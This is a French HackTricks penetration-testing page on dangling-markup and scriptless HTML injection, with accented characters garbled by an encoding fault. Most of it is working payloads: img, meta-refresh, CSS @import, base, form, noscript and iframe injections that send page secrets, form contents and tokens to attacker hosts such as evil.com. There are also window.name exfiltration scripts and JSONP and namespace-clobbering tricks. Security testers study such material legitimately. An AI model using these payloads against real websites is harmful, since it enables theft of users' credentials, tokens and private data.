# Dangling Markup - Injection HTML sans script

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## R√©sum√©

Cette technique peut √™tre utilis√©e pour extraire des informations d'un utilisateur lorsqu'une **injection HTML est trouv√©e**. Cela est tr√®s utile si vous **ne trouvez aucun moyen d'exploiter un** [**XSS** ](../xss-cross-site-scripting/)mais que vous pouvez **injecter des balises HTML**.\
C'est √©galement utile si un **secret est enregistr√© en clair** dans le HTML et que vous souhaitez **l'exfiltrer** du client, ou si vous souhaitez induire en erreur l'ex√©cution d'un script.

Plusieurs techniques comment√©es ici peuvent √™tre utilis√©es pour contourner certaines [**Politiques de s√©curit√© du contenu**](../content-security-policy-csp-bypass/) en exfiltrant des informations de mani√®re inattendue (balises html, CSS, balises http-meta, formulaires, base...).

## Principales Applications

### Vol de secrets en texte clair

Si vous injectez `<img src='http://evil.com/log.cgi?` lorsque la page est charg√©e, la victime vous enverra tout le code entre la balise `img` inject√©e et la prochaine guillemet √† l'int√©rieur du code. Si un secret est situ√© de quelque mani√®re que ce soit dans ce fragment, vous le volerez (vous pouvez faire la m√™me chose en utilisant des guillemets doubles, regardez ce qui pourrait √™tre plus int√©ressant √† utiliser).

Si la balise `img` est interdite (en raison de la CSP par exemple), vous pouvez √©galement utiliser `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Notez que **Chrome bloque les URL HTTP** contenant "<" ou "\n", vous pouvez donc essayer d'autres sch√©mas de protocole comme "ftp".

Vous pouvez √©galement abuser du CSS `@import` (il enverra tout le code jusqu'√† ce qu'il trouve un ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Vous pourriez √©galement utiliser **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Vous pourriez √©galement ins√©rer une balise `<base`. Toutes les informations seront envoy√©es jusqu'√† ce que la citation soit ferm√©e, mais cela n√©cessite une certaine interaction de l'utilisateur (l'utilisateur doit cliquer sur un lien, car la balise base aura modifi√© le domaine point√© par le lien) :
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Vol de formulaires
```html
<base href='http://evil.com/'>
```
Ensuite, les formulaires qui envoient des donn√©es vers un chemin (comme `<form action='update_profile.php'>`) enverront les donn√©es vers le domaine malveillant.

### Vol de formulaires 2

D√©finissez un en-t√™te de formulaire : `<form action='http://evil.com/log_steal'>` cela √©crasera l'en-t√™te du formulaire suivant et toutes les donn√©es du formulaire seront envoy√©es √† l'attaquant.

### Vol de formulaires 3

Le bouton peut modifier l'URL vers laquelle les informations du formulaire vont √™tre envoy√©es avec l'attribut "formaction" :
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaquant peut utiliser cela pour voler les informations.

Trouvez un [**exemple de cette attaque dans ce document**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Vol de secrets en texte clair 2

En utilisant la technique mentionn√©e pr√©c√©demment pour voler des formulaires (en injectant un nouvel en-t√™te de formulaire), vous pouvez ensuite injecter un nouveau champ d'entr√©e :
```html
<input type='hidden' name='review_body' value="
```
et ce champ de saisie contiendra tout le contenu entre ses guillemets doubles et les guillemets doubles suivants dans le HTML. Cette attaque m√©lange le "_**Vol de secrets en texte clair**_" avec "_**Vol de formulaires2**_".

Vous pouvez faire la m√™me chose en injectant un formulaire et une balise `<option>`. Toutes les donn√©es jusqu'√† ce qu'un `</option>` ferm√© soit trouv√© seront envoy√©es:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injection de param√®tre de formulaire

Vous pouvez modifier le chemin d'un formulaire et ins√©rer de nouvelles valeurs pour qu'une action inattendue soit effectu√©e :
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Vol de secrets en texte clair via noscript

`<noscript></noscript>` est une balise dont le contenu sera interpr√©t√© si le navigateur ne prend pas en charge JavaScript (vous pouvez activer/d√©sactiver JavaScript dans Chrome √† [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Une fa√ßon d'exfiltrer le contenu de la page web du point d'injection jusqu'en bas vers un site contr√¥l√© par un attaquant sera d'injecter ceci :
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Contournement de CSP avec interaction utilisateur

√Ä partir de cette [recherche de portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), vous pouvez apprendre que m√™me dans les environnements les plus **restreints par CSP**, vous pouvez toujours **exfiltrer des donn√©es** avec une certaine **interaction utilisateur**. Cette fois, nous allons utiliser la charge utile :
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Notez que vous demanderez √† la **victime** de **cliquer sur un lien** qui la **redirigera** vers un **payload** contr√¥l√© par vous. Notez √©galement que l'attribut **`target`** √† l'int√©rieur de la balise **`base`** contiendra du **contenu HTML** jusqu'√† l'apostrophe suivante.\
Cela fera en sorte que la **valeur** de **`window.name`** si le lien est cliqu√© sera tout ce **contenu HTML**. Par cons√©quent, comme vous **contr√¥lez la page** √† laquelle la victime acc√®de en cliquant sur le lien, vous pouvez acc√©der √† ce **`window.name`** et **exfiltrer** ces donn√©es:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Attaque de l'espace de noms HTML

Ins√©rez une nouvelle balise avec un identifiant √† l'int√©rieur du HTML qui √©crasera la suivante et avec une valeur qui affectera le flux d'un script. Dans cet exemple, vous s√©lectionnez avec qui une information va √™tre partag√©e:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flux de travail de script trompeur 2 - Attaque de l'espace de noms du script

Cr√©ez des variables √† l'int√©rieur de l'espace de noms javascript en ins√©rant des balises HTML. Ensuite, cette variable affectera le flux de l'application:
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abus de JSONP

Si vous trouvez une interface JSONP, vous pourriez √™tre en mesure d'appeler une fonction arbitraire avec des donn√©es arbitraires :
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Ou vous pouvez m√™me essayer d'ex√©cuter du javascript :
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Mauvais usage des iframes

Un document enfant poss√®de la capacit√© de visualiser et de modifier la propri√©t√© `location` de son parent, m√™me dans des situations de cross-origin. Cela permet d'int√©grer un script dans un **iframe** qui peut rediriger le client vers une page arbitraire :
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Cela peut √™tre att√©nu√© avec quelque chose comme : `sandbox=' allow-scripts allow-top-navigation'`

Un iframe peut √©galement √™tre utilis√© pour divulguer des informations sensibles √† partir d'une page diff√©rente en utilisant l'attribut de nom de l'iframe. Cela est d√ª au fait que vous pouvez cr√©er un iframe qui s'iframe lui-m√™me en abusant de l'injection HTML qui fait appara√Ætre les informations sensibles √† l'int√©rieur de l'attribut de nom de l'iframe, puis acc√©der √† ce nom depuis l'iframe initial et le divulguer.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Pour plus d'informations, consultez [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### Abus de \<meta

Vous pouvez utiliser **`meta http-equiv`** pour effectuer **plusieurs actions** comme d√©finir un Cookie : `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou effectuer une redirection (dans 5s dans ce cas) : `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Cela peut √™tre **√©vit√©** avec un **CSP** concernant **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nouvelle balise HTML \<portal

Vous pouvez trouver une recherche tr√®s **int√©ressante** sur les vuln√©rabilit√©s exploitables de la balise \<portal [ici](https://research.securitum.com/security-analysis-of-portal-element/).\
Au moment de la r√©daction de cet article, vous devez activer la balise portal sur Chrome dans `chrome://flags/#enable-portals` sinon cela ne fonctionnera pas.
```html
<portal src='https://attacker-server?
```
### Fuites HTML

Toutes les fa√ßons de divulguer la connectivit√© en HTML ne seront pas utiles pour le Dangling Markup, mais parfois cela pourrait aider. Consultez-les ici: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Fuites SS

Il s'agit d'un **m√©lange** entre le **dangling markup et les XS-Leaks**. D'un c√¥t√©, la vuln√©rabilit√© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **m√™me origine** que celle que nous attaquerons. D'un autre c√¥t√©, nous n'**attaquerons** pas directement la page o√π nous pouvons injecter du HTML, mais **une autre page**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

Les XS-Search sont orient√©s pour **exfiltrer des informations entre origines** en abusant des **attaques de canal secondaire**. Par cons√©quent, c'est une technique diff√©rente du Dangling Markup, cependant, certaines des techniques abusent de l'inclusion de balises HTML (avec et sans ex√©cution de JS), comme l'**injection de CSS** ou le **chargement paresseux des images**.

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Liste de d√©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## R√©f√©rences

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
